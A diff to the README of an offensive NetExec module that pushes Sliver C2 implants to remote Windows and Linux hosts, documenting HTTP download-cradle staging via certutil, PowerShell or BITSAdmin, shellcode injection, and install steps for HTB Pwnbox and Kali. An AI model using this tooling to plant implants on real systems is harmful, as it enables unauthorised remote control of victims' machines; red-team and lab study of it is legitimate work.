@@ -20,19 +20,23 @@ A NetExec (formerly CrackMapExec) module that deploys Sliver C2 implants to remo
 
 1. **Direct Implant Upload**
    - Uploads full implant binary directly to target
-   - Works with all protocols (SMB, WinRM, SSH, MSSQL)
+   - Works with SMB, WinRM, SSH protocols
    - Simple, reliable, ~17MB payload upload
+   - **Note**: MSSQL now defaults to HTTP Download Staging (see below)
 
-2. **HTTP Download Staging**
+2. **HTTP Download Staging** *(Default for MSSQL)*
    - Executes tiny download cradle (~200 bytes) on target
    - Target downloads implant from Sliver-hosted HTTP server
    - Three download methods: PowerShell, certutil, BITSAdmin
    - Automatic cleanup of HTTP listener and website
+   - **MSSQL**: Defaults to certutil (use `STAGING=direct` to force chunked upload)
 
 3. **TCP/HTTP Shellcode Injection**
    - In-memory shellcode injection
    - Two-stage: bootstrap shellcode + full implant
    - WinRM protocol only
+
+**Breaking Change (v0.2.0)**: MSSQL now defaults to HTTP download staging instead of chunked upload. Use `STAGING=direct` to force old behavior for air-gapped targets.
 
 ## Requirements
 
@@ -58,7 +62,7 @@ The original test slowdown (~116s collection time) was caused by including the f
 
 ## Installation
 
-### Prerequisited
+### Prerequisites
 
 Install Sliver
 ```bash
@@ -88,29 +92,28 @@ This script will:
 
 For installation options and details, see `scripts/install.sh`.
 
-### HTB Pwnbox Installation
+### Manual HTB Pwnbox Installation
 
 Copy-paste commands for quick setup on HTB Pwnbox:
 
 ```bash
-# 1. Install NetExec (if not already installed)
-pipx install git+https://github.com/Pennyw0rth/NetExec
+# Note: HTB Pwnbox comes with NetExec 1.2.0 pre-installed at /opt/pipx/venvs/netexec/
 
-# 2. Clone and build the module
-cd /tmp
+# 1. Clone and build the module
 git clone https://github.com/moerketh/sliver-netexec-module.git
 cd sliver-netexec-module
+
+# Disable Poetry keyring (prevents AT_SECURE errors with sudo)
+export PYTHON_KEYRING_BACKEND=keyring.backends.null.Keyring
+
 poetry install
 poetry build
 
-# 3. Inject module into NetExec
-pipx inject netexec dist/sliver_nxc_module-0.1.0-py3-none-any.whl
+# 2. Install module into NetExec venv (direct python -m pip)
+sudo /opt/pipx/venvs/netexec/bin/python -m pip install dist/sliver_nxc_module-*.whl
 
-# 4. Verify installation
+# 3. Verify installation
 netexec smb -L | grep sliver_exec
-
-# 5. Setup Sliver config
-cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
 ```
 
 ### Kali Linux Installation
@@ -126,24 +129,27 @@ sudo apt install -y netexec
 # sudo apt install -y pipx
 # pipx install git+https://github.com/Pennyw0rth/NetExec
 
-# 2. Clone and build the module
+# 2. Install poetry (if not already installed)
+pipx install poetry 2>/dev/null || sudo apt install -y python3-poetry
+
+# 3. Clone and build the module
 cd /tmp
 git clone https://github.com/moerketh/sliver-netexec-module.git
 cd sliver-netexec-module
 poetry install
 poetry build
 
-# 3. Install module (choose based on NetExec installation)
+# 4. Install module (choose based on NetExec installation)
 # If NetExec installed via apt:
 sudo pip3 install dist/sliver_nxc_module-0.1.0-py3-none-any.whl --break-system-packages
 
-# If NetExec installed via pipx:
+# If NetExec installed via pipx (user installation):
 pipx inject netexec dist/sliver_nxc_module-0.1.0-py3-none-any.whl
 
-# 4. Verify installation
+# 5. Verify installation
 netexec smb -L | grep sliver_exec
 
-# 5. Setup Sliver config
+# 6. Setup Sliver config
 cp ~/.sliver-client/configs/${USER}_localhost.cfg ~/.sliver-client/configs/default.cfg
 ```
 
@@ -184,7 +190,7 @@ nxc winrm 192.168.1.10 -u Administrator -p 'P@ssw0rd!' \
 |--------|---------|-------------|
 | `RHOST` | **Required*** | Sliver mTLS listener IP |
 | `RPORT` | `443` | Sliver mTLS listener port (optional) |
-| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, or `False` to disable |
+| `STAGING` | `False` | Staging mode: `http`, `tcp`, `https`, `direct`, or `False` to disable |
 | `STAGER_RHOST` | `RHOST` | Staging server IP (defaults to same as RHOST) |
 | `STAGING_PORT` | `8080` | HTTP port for hosting implant (HTTP download staging) |
 | `DOWNLOAD_TOOL` | `powershell` | Download method: `powershell`, `certutil`, `bitsadmin`, `wget`, `curl`, `python` |
